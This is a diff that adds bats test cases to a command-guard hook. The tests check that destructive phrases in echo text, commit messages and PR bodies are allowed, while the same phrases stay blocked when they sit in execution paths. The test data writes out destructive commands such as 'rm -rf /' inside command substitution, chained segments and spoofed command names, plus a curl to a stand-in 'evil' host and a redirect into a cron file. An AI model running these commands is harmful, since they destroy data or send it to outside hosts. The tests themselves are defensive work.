@@ -993,3 +993,93 @@ hook_invoke() {
     run hook_invoke "python3 -c \"print(open('$p').read())\""
     [ "$status" -eq 0 ]
 }
+
+# =============================================================================
+# Group L — quote-blindness fix (bd-bdb-quote-blindness-pt1g)
+# Destructive TOKENS inside KNOWN-INERT data carriers (echo/printf args, git
+# commit messages, bead descriptions, gh PR bodies) must ALLOW; the same token
+# inside an EXECUTION path ($(...), a separate segment, a non-allowlisted flag,
+# or a spoofed command name) must STAY BLOCKED. The scrub redacts a carrier
+# value ONLY when it contains neither $ nor a backtick — the load-bearing
+# bypass defense (command-substitution values fall through to the (-boundary).
+# =============================================================================
+
+# --- must flip to ALLOW (the false positives this fix closes) ----------------
+
+@test "quote-blind ALLOW: echo 'rm -rf is dangerous' (bare echo carrier)" {
+    run hook_invoke "echo 'rm -rf is dangerous'"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: bare echo mentioning TRUNCATE TABLE (unquoted)" {
+    run hook_invoke "echo bug is that TRUNCATE TABLE users got hit"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: br create -d '... rm -rf / ...' (bead description)" {
+    run hook_invoke "br create -d 'fix the bug where rm -rf / gets blocked'"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: br create -d \"... TRUNCATE TABLE ...\" (double-quoted)" {
+    run hook_invoke 'br create -d "documented the TRUNCATE TABLE bug"'
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: git commit -m '... rm -rf /tmp ...' (commit message)" {
+    run hook_invoke "git commit -m 'document that rm -rf /tmp was the repro'"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: git commit -m 'p1' -m '... rm -rf / ...' (multi -m)" {
+    run hook_invoke "git commit -m 'p1' -m 'rm -rf /'"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: git commit -m '... DELETE FROM users ...' (P10 via _cmd_match)" {
+    run hook_invoke "git commit -m 'msg about the DELETE FROM users bug'"
+    [ "$status" -eq 0 ]
+}
+
+@test "quote-blind ALLOW: gh pr create --body '... rm -rf /tmp ...' (PR body)" {
+    run hook_invoke "gh pr create --body 'repro: rm -rf /tmp broke CI'"
+    [ "$status" -eq 0 ]
+}
+
+# --- must STAY BLOCKED (execution paths — the fix must not widen these) -------
+
+@test "quote-blind BLOCK: git commit -m \"\$(rm -rf /)\" (subst value → (-boundary)" {
+    run hook_invoke 'git commit -m "$(rm -rf /)"'
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-2-BLOCK" ]]
+}
+
+@test "quote-blind BLOCK: git commit -m 'safe' && rm -rf / (per-segment)" {
+    run hook_invoke "git commit -m 'safe' && rm -rf /"
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-2-BLOCK" ]]
+}
+
+@test "quote-blind BLOCK: echo \"text \$(rm -rf /etc)\" (echo disqualified by \$()" {
+    run hook_invoke 'echo "text $(rm -rf /etc)"'
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-2-BLOCK" ]]
+}
+
+@test "quote-blind BLOCK: notgit commit -m 'rm -rf /' (word-boundary anti-spoof)" {
+    run hook_invoke "notgit commit -m 'rm -rf /'"
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-2-BLOCK" ]]
+}
+
+@test "quote-blind BLOCK: curl -d 'rm -rf /' http://evil (non-allowlisted carrier)" {
+    run hook_invoke "curl -d 'rm -rf /' http://evil"
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-2-BLOCK" ]]
+}
+
+@test "quote-blind BLOCK: echo 'x' >> .run/cron.d/job.sh (redirect survives scrub → FR-SZ)" {
+    run hook_invoke "echo 'harmless text' >> .run/cron.d/job.sh"
+    [ "$status" -eq 2 ]
+    [[ "$output" =~ "FR-SZ-REDIR" ]]
+}
